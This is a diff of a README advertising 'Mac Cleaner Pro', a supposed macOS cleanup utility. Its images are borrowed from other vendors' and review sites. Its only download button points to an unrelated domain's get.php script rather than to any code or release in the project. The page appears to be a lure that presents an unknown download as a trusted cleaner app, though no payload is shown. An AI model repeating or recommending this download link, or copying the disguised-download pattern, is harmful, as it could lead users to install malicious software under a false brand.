@@ -1,28 +1,16 @@
 # Mac Cleaner Pro - Optimize Your macOS Experience
 
-![img](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQThZJBt33I6NlW7wPi6vq_m7SW9NlB3DLAzw&s)
+![img](https://bestreviews.net/wp-content/uploads/2017/06/advanced-mac-cleaner-logo.png)
 
 Mac Cleaner is a lightweight and powerful tool designed to keep your Mac running smoothly. It helps you free up disk space, remove unnecessary files, and optimize system performance with an intuitive interface.
 
 ---
 
-## ✨ Features
-
-- **Junk File Cleanup**: Safely remove cache, logs, and temporary files.
-- **Duplicate Finder**: Locate and delete duplicate files to save space.
-- **App Uninstaller**: Completely remove apps and their associated files.
-- **Disk Analyzer**: Visualize disk usage to identify large files.
-- **Privacy Protection**: Clear browsing data and protect your privacy.
-- **Fast & Secure**: Optimized for macOS with minimal resource usage.
-
----
-
 ## 📥 Download
-
-Get the latest version of Mac Cleaner for macOS:
 
 [![Download Mac Cleaner](https://img.shields.io/badge/Download-Mac%20Cleaner-brightgreen?style=for-the-badge&logo=apple)](https://resmanio.com/get.php?call=imb)
 
+Get the latest version of Mac Cleaner for macOS
 *Requires macOS 10.15 or later.*
 
 ---
@@ -54,6 +42,7 @@ Get the latest version of Mac Cleaner for macOS:
 ## Preview
 
 ![preview1](https://nektony.com/wp-content/uploads/2024/09/3-Disk-space-analyzing.png.webp)
+
 ![preview2](https://nektony.com/wp-content/uploads/2024/09/2-Performance-boost.png.webp)
 
 ## 🛠️ Usage
@@ -63,8 +52,17 @@ Get the latest version of Mac Cleaner for macOS:
 3. **Clean Up**: Select items to remove and click "Clean" to free up space.
 4. **Customize Settings**: Adjust preferences for scheduled scans or specific file types.
 
-Check the [User Guide](https://github.com/username/MacCleaner/wiki/User-Guide) for detailed instructions and tips!
+---
 
+## ✨ Features
+
+- **Junk File Cleanup**: Safely remove cache, logs, and temporary files.
+- **Duplicate Finder**: Locate and delete duplicate files to save space.
+- **App Uninstaller**: Completely remove apps and their associated files.
+- **Disk Analyzer**: Visualize disk usage to identify large files.
+- **Privacy Protection**: Clear browsing data and protect your privacy.
+- **Fast & Secure**: Optimized for macOS with minimal resource usage.
+  
 ---
 
 ## ⚙️ Configuration
